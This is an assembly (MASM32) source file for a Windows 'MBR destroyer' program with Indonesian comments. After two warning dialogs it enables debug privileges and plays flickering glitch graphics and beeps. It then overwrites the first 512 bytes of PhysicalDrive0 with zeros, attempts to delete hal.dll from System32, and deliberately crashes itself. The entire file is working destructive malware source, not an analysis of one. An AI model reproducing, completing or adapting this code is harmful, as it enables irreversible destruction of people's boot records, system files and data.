.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\gdi32.inc
include \masm32\include\advapi32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\gdi32.lib
includelib \masm32\lib\advapi32.lib

.data
    szCaption db "SYSTEM WARNING", 0
    szMessage1 db "CRITICAL SYSTEM ALERT: Memory corruption detected.", 0Dh, 0Ah
               db "Running this program may cause permanent damage.", 0Dh, 0Ah
               db "Continue only in a controlled environment.", 0Dh, 0Ah
               db "Do you wish to proceed?", 0
    szMessage2 db "FINAL WARNING: This will overwrite critical system areas", 0Dh, 0Ah
               db "including the Master Boot Record (MBR).", 0Dh, 0Ah
               db "This action is IRREVERSIBLE without proper backups.", 0Dh, 0Ah
               db "Are you absolutely sure you want to continue?", 0
    szError db "Access denied. Admin privileges required.", 0
    driveName db "\\.\PhysicalDrive0", 0
    mbrData db 512 dup(0)  ; Empty MBR data
    
    ; Glitch messages
    glitchMessages dd offset glitch1, offset glitch2, offset glitch3, offset glitch4
    glitch1 db "MEMORY CORRUPTION DETECTED", 0
    glitch2 db "SYSTEM FAILURE IMMINENT", 0
    glitch3 db "KERNEL PANIC", 0
    glitch4 db "HARDWARE MALFUNCTION", 0
    
    ; For privilege escalation
    tokenHandle dd 0
    tkp TOKEN_PRIVILEGES <?>
    
.data?
    hDC dd ?
    hWindow dd ?
    counter dd ?
    hDrive dd ?
    bytesWritten dd ?
    rect RECT <?>
    hThread1 dd ?
    hThread2 dd ?
    hBitmap dd ?
    hOldBitmap dd ?
    hCompatibleDC dd ?

.code
; Thread untuk efek visual glitch
GlitchThread proc param:DWORD
    invoke GetDesktopWindow
    mov hWindow, eax
    invoke GetDC, hWindow
    mov hDC, eax
    
    ; Buat compatible DC untuk double buffering
    invoke CreateCompatibleDC, hDC
    mov hCompatibleDC, eax
    invoke GetSystemMetrics, SM_CXSCREEN
    mov ebx, eax
    invoke GetSystemMetrics, SM_CYSCREEN
    invoke CreateCompatibleBitmap, hDC, ebx, eax
    mov hBitmap, eax
    invoke SelectObject, hCompatibleDC, hBitmap
    mov hOldBitmap, eax
    
    glitch_loop:
        ; Clear screen dengan warna acak
        invoke GetTickCount
        and eax, 0FFFFFFh
        invoke CreateSolidBrush, eax
        push eax
        invoke GetClientRect, hWindow, addr rect
        invoke FillRect, hCompatibleDC, addr rect, eax
        pop eax
        invoke DeleteObject, eax
        
        ; Gambar garis-garis acak dengan intensitas meningkat
        invoke GetTickCount
        mov ecx, counter
        add ecx, 20  ; Jumlah garis meningkat seiring waktu
        cmp ecx, 200
        jle draw_lines
        mov ecx, 200
        draw_lines:
            push ecx
            invoke GetSystemMetrics, SM_CXSCREEN
            mov edx, eax
            invoke GetSystemMetrics, SM_CYSCREEN
            invoke GetTickCount
            and eax, edx
            mov esi, eax
            invoke GetTickCount
            and eax, 0FFFFh
            mov edi, eax
            invoke GetTickCount
            and eax, 0FFFFFFh
            invoke CreatePen, PS_SOLID, 3, eax
            push eax
            invoke SelectObject, hCompatibleDC, eax
            invoke MoveToEx, hCompatibleDC, esi, 0, NULL
            invoke LineTo, hCompatibleDC, edi, eax
            pop eax
            invoke DeleteObject, eax
            pop ecx
            loop draw_lines
        
        ; Tampilkan pesan glitch acak dengan efek berkedip
        invoke GetTickCount
        and eax, 3
        mov edx, [glitchMessages + eax*4]
        invoke SetBkMode, hCompatibleDC, TRANSPARENT
        invoke SetTextColor, hCompatibleDC, 000FF00h
        invoke GetTickCount
        and eax, 0FFh
        mov esi, eax
        invoke GetTickCount
        and eax, 0FFh
        mov edi, eax
        invoke TextOut, hCompatibleDC, esi, edi, edx, lstrlen(edx)
        
        ; Copy buffer ke screen
        invoke BitBlt, hDC, 0, 0, rect.right, rect.bottom, hCompatibleDC, 0, 0, SRCCOPY
        
        ; Delay semakin pendek (efek semakin cepat)
        invoke GetTickCount
        and eax, 15
        add eax, 5
        invoke Sleep, eax
        
        ; Tingkatkan intensitas
        inc counter
        cmp counter, 300  ; Durasi efek lebih lama
        jl glitch_loop
    
    ; Cleanup
    invoke SelectObject, hCompatibleDC, hOldBitmap
    invoke DeleteObject, hBitmap
    invoke DeleteDC, hCompatibleDC
    invoke ReleaseDC, hWindow, hDC
    ret
GlitchThread endp

; Thread untuk efek suara dengan intensitas meningkat
SoundThread proc param:DWORD
    sound_loop:
        invoke GetTickCount
        and eax, 0FFFh
        add eax, 100
        push eax
        invoke GetTickCount
        and eax, 0FFh
        add eax, 10
        invoke Beep, eax, [esp]
        pop eax
        
        invoke Sleep, 50
        inc counter
        cmp counter, 300
        jl sound_loop
    ret
SoundThread endp

; Fungsi untuk eskalasi privilege
EnablePrivileges proc
    invoke GetCurrentProcess
    invoke OpenProcessToken, eax, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr tokenHandle
    test eax, eax
    jz privilege_fail
    
    invoke LookupPrivilegeValue, NULL, SE_DEBUG_NAME, addr tkp.Privileges[0].Luid
    test eax, eax
    jz privilege_fail
    
    mov tkp.PrivilegeCount, 1
    mov tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
    
    invoke AdjustTokenPrivileges, tokenHandle, FALSE, addr tkp, sizeof TOKEN_PRIVILEGES, NULL, NULL
    test eax, eax
    jz privilege_fail
    
    ret
    
    privilege_fail:
    invoke MessageBox, NULL, addr szError, addr szCaption, MB_OK or MB_ICONERROR
    invoke ExitProcess, 1
EnablePrivileges endp

; Fungsi untuk overwrite MBR
OverwriteMBR proc
    ; Coba overwrite MBR
    invoke CreateFile, addr driveName, GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL
    mov hDrive, eax
    cmp eax, INVALID_HANDLE_VALUE
    je mbr_fail
    
    invoke WriteFile, hDrive, addr mbrData, 512, addr bytesWritten, NULL
    invoke CloseHandle, hDrive
    ret
    
    mbr_fail:
    ; Fallback ke crash methods lainnya
    ret
OverwriteMBR endp

; Fungsi utama
start:
    ; Tampilkan peringatan pertama
    invoke MessageBox, NULL, addr szMessage1, addr szCaption, MB_YESNO or MB_ICONWARNING
    cmp eax, IDNO
    je exit_program
    
    ; Tampilkan peringatan kedua
    invoke MessageBox, NULL, addr szMessage2, addr szCaption, MB_YESNO or MB_ICONERROR
    cmp eax, IDNO
    je exit_program
    
    ; Eskalasi privilege
    call EnablePrivileges
    
    ; Mulai thread efek visual
    invoke CreateThread, NULL, 0, addr GlitchThread, NULL, 0, addr hThread1
    
    ; Mulai thread efek suara
    invoke CreateThread, NULL, 0, addr SoundThread, NULL, 0, addr hThread2
    
    ; Tunggu efek berjalan
    invoke Sleep, 8000  ; Durasi efek lebih lama
    
    ; Overwrite MBR
    call OverwriteMBR
    
    ; Crash sistem dengan berbagai cara
    ; 1. Hapus file sistem penting (jika memiliki akses)
    invoke DeleteFile, "C:\Windows\System32\hal.dll"
    
    ; 2. Penyalahgunaan memori - multiple attempts
    mov eax, 0
    mov dword ptr [eax], 0DEADBEEFh
    
    mov eax, 4
    mov dword ptr [eax], 0BADF00Dh
    
    ; 3. Invalid instruction
    db 0FFh, 0FFh  ; Invalid instruction
    
    ; 4. Infinite loop jika masih berjalan
    jmp $
    
    exit_program:
    invoke ExitProcess, 0
end start
